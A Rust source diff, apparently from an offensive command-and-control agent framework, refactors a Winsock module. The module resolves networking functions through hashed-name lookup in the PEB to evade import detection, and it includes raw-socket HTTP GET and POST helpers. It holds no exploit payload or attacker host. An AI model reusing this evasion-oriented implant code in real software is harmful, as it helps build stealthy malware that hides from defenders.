@@ -1,28 +1,41 @@
-use alloc::{
-    ffi::CString,
-    format,
-    string::{String, ToString},
-    vec::Vec,
-};
+use alloc::{borrow::ToOwned as _, ffi::CString, format, string::String, vec::Vec};
 use core::{
     ffi::c_void,
-    mem::{transmute, zeroed},
+    mem::zeroed,
     ptr::{null, null_mut},
     sync::atomic::{AtomicBool, Ordering},
 };
 
 use kageshirei_win32::{
     ntdef::UnicodeString,
-    ws2_32::{AddrInfo, SockAddr, SockAddrIn, Winsock, WsaData, SOCKET},
+    ws2_32::{
+        AddrInfo,
+        CloseSocketFunc,
+        ConnectFunc,
+        FreeAddrInfoFunc,
+        GetAddrInfoFunc,
+        HtonsFunc,
+        InetAddrFunc,
+        IoctlsocketFunc,
+        RecvFunc,
+        SelectFunc,
+        SendFunc,
+        SockAddr,
+        SockAddrIn,
+        SocketFunc,
+        WSACleanupFunc,
+        WSAGetLastErrorFunc,
+        WSAStartupFunc,
+        Winsock,
+        WsaData,
+        SOCKET,
+    },
 };
-use mod_agentcore::{
-    instance,
-    ldr::{nt_get_last_error, peb_get_function_addr},
-};
+use mod_agentcore::{instance, ldr::nt_get_last_error, resolve_direct_syscalls};
 
-// Global variable to store Winsock functions
+/// Global variable to store Winsock functions
 static mut WINSOCK_FUNCS: Option<Winsock> = None;
-// Atomic variable to track if Winsock functions have been initialized
+/// Atomic variable to track if Winsock functions have been initialized
 static INIT_WINSOCKS: AtomicBool = AtomicBool::new(false);
 
 /// Initializes Winsock functions.
@@ -33,22 +46,6 @@ static INIT_WINSOCKS: AtomicBool = AtomicBool::new(false);
 pub fn init_winsock_funcs() {
     unsafe {
         if !INIT_WINSOCKS.load(Ordering::Acquire) {
-            // Constants representing hash values of Winsock function names
-            pub const WSA_STARTUP_DBJ2: usize = 0x142e89c3;
-            pub const WSA_CLEANUP_DBJ2: usize = 0x32206eb8;
-            pub const SOCKET_DBJ2: usize = 0xcf36c66e;
-            pub const CONNECT_DBJ2: usize = 0xe73478ef;
-            pub const SEND_DBJ2: usize = 0x7c8bc2cf;
-            pub const RECV_DBJ2: usize = 0x7c8b3515;
-            pub const CLOSESOCKET_DBJ2: usize = 0x185953a4;
-            pub const INET_ADDR_DBJ2: usize = 0xafe73c2f;
-            pub const HTONS_DBJ2: usize = 0xd454eb1;
-            pub const GETADDRINFO_DBJ2: usize = 0x4b91706c;
-            pub const FREEADDRINFO_DBJ2: usize = 0x307204e;
-            pub const IOCTLSOCKET_H: usize = 0xd5e978a9;
-            pub const SELECT_H: usize = 0xce86a705;
-            pub const WSAGETLASTERROR_H: usize = 0x9c1d912e;
-
             // DLL name for Winsock
             let dll_name = "ws2_32.dll";
             let mut ws2_win32_dll_unicode = UnicodeString::new();
@@ -74,38 +71,32 @@ pub fn init_winsock_funcs() {
 
             let ws2_32_module = ws2_win32_handle as *mut u8;
 
-            // Resolve function addresses using hashed names
-            let wsa_startup_addr = peb_get_function_addr(ws2_32_module, WSA_STARTUP_DBJ2);
-            let wsa_cleanup_addr = peb_get_function_addr(ws2_32_module, WSA_CLEANUP_DBJ2);
-            let socket_addr = peb_get_function_addr(ws2_32_module, SOCKET_DBJ2);
-            let connect_addr = peb_get_function_addr(ws2_32_module, CONNECT_DBJ2);
-            let send_addr = peb_get_function_addr(ws2_32_module, SEND_DBJ2);
-            let recv_addr = peb_get_function_addr(ws2_32_module, RECV_DBJ2);
-            let closesocket_addr = peb_get_function_addr(ws2_32_module, CLOSESOCKET_DBJ2);
-            let inet_addr_addr = peb_get_function_addr(ws2_32_module, INET_ADDR_DBJ2);
-            let htons_addr = peb_get_function_addr(ws2_32_module, HTONS_DBJ2);
-            let getaddrinfo_addr = peb_get_function_addr(ws2_32_module, GETADDRINFO_DBJ2);
-            let freeaddrinfo_addr = peb_get_function_addr(ws2_32_module, FREEADDRINFO_DBJ2);
-            let ioctlsocket_addr = peb_get_function_addr(ws2_32_module, IOCTLSOCKET_H);
-            let select_addr = peb_get_function_addr(ws2_32_module, SELECT_H);
-            let wsa_get_last_error_addr = peb_get_function_addr(ws2_32_module, WSAGETLASTERROR_H);
-
             // Initialize Winsock functions
             let mut winsock_functions = Winsock::new();
-            winsock_functions.wsa_startup = Some(transmute(wsa_startup_addr));
-            winsock_functions.wsa_cleanup = Some(transmute(wsa_cleanup_addr));
-            winsock_functions.socket = Some(transmute(socket_addr));
-            winsock_functions.connect = Some(transmute(connect_addr));
-            winsock_functions.send = Some(transmute(send_addr));
-            winsock_functions.recv = Some(transmute(recv_addr));
-            winsock_functions.closesocket = Some(transmute(closesocket_addr));
-            winsock_functions.inet_addr = Some(transmute(inet_addr_addr));
-            winsock_functions.htons = Some(transmute(htons_addr));
-            winsock_functions.getaddrinfo = Some(transmute(getaddrinfo_addr));
-            winsock_functions.freeaddrinfo = Some(transmute(freeaddrinfo_addr));
-            winsock_functions.ioctlsocket = Some(transmute(ioctlsocket_addr));
-            winsock_functions.select = Some(transmute(select_addr));
-            winsock_functions.wsa_get_last_error = Some(transmute(wsa_get_last_error_addr));
+
+            resolve_direct_syscalls!(
+                ws2_32_module,
+                [
+                    (winsock_functions.wsa_startup, 0x142e89c3, WSAStartupFunc),
+                    (winsock_functions.wsa_cleanup, 0x32206eb8, WSACleanupFunc),
+                    (winsock_functions.socket, 0xcf36c66e, SocketFunc),
+                    (winsock_functions.connect, 0xe73478ef, ConnectFunc),
+                    (winsock_functions.send, 0x7c8bc2cf, SendFunc),
+                    (winsock_functions.recv, 0x7c8b3515, RecvFunc),
+                    (winsock_functions.closesocket, 0x185953a4, CloseSocketFunc),
+                    (winsock_functions.inet_addr, 0xafe73c2f, InetAddrFunc),
+                    (winsock_functions.htons, 0xd454eb1, HtonsFunc),
+                    (winsock_functions.getaddrinfo, 0x4b91706c, GetAddrInfoFunc),
+                    (winsock_functions.freeaddrinfo, 0x307204e, FreeAddrInfoFunc),
+                    (winsock_functions.ioctlsocket, 0xd5e978a9, IoctlsocketFunc),
+                    (winsock_functions.select, 0xce86a705, SelectFunc),
+                    (
+                        winsock_functions.wsa_get_last_error,
+                        0x9c1d912e,
+                        WSAGetLastErrorFunc
+                    )
+                ]
+            );
 
             // Store the functions in the global variable
             WINSOCK_FUNCS = Some(winsock_functions);
@@ -130,7 +121,7 @@ pub fn init_winsock_funcs() {
 )]
 pub fn get_winsock() -> &'static Winsock {
     init_winsock_funcs();
-    return unsafe { WINSOCK_FUNCS.as_ref().unwrap() };
+    unsafe { WINSOCK_FUNCS.as_ref().unwrap() }
 }
 
 /// Initializes the Winsock library for network operations.
@@ -155,7 +146,7 @@ pub fn init_winsock() -> i32 {
             result
         }
         else {
-            return -1;
+            -1
         }
     }
 }
@@ -359,14 +350,14 @@ pub fn receive_response(sock: SOCKET) -> Result<String, String> {
                 }
                 else {
                     response.push_str(&String::from_utf8_lossy(
-                        &buffer[.. bytes_received as usize],
+                        buffer.get(.. bytes_received as usize).unwrap(),
                     ));
                 }
             }
             Ok(response)
         }
         else {
-            Err("recv function is not available".to_string())
+            Err("recv function is not available".to_owned())
         }
     }
 }
@@ -392,9 +383,10 @@ pub fn http_get(url: &str, path: &str) -> Result<String, String> {
         "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
         path, url
     );
-    send_request(sock, &request.as_bytes());
+    send_request(sock, request.as_bytes());
 
     let response = receive_response(sock)?;
+    // SAFETY: get_winsock ensures the function pointer is valid and not null
     unsafe {
         if let Some(closesocket_func) = get_winsock().closesocket {
             closesocket_func(sock);
@@ -430,9 +422,11 @@ pub fn http_post(url: &str, path: &str, data: &str) -> Result<String, String> {
         data.len(),
         data
     );
-    send_request(sock, &request.as_bytes());
+    send_request(sock, request.as_bytes());
 
     let response = receive_response(sock)?;
+
+    // SAFETY: get_winsock ensures the function pointer is valid and not null
     unsafe {
         if let Some(closesocket_func) = get_winsock().closesocket {
             closesocket_func(sock);
